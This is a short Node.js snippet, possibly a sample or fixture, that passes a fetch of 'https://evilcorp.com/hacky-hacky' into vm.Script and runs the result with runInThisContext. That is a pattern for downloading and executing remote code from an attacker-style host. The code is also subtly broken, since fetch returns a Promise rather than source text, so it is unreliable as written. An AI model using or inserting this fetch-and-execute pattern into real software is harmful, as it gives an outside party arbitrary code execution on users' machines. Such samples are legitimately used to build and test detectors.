const vm = require('node:vm');
const script = new vm.Script(fetch('https://evilcorp.com/hacky-hacky'));
script.runInThisContext();
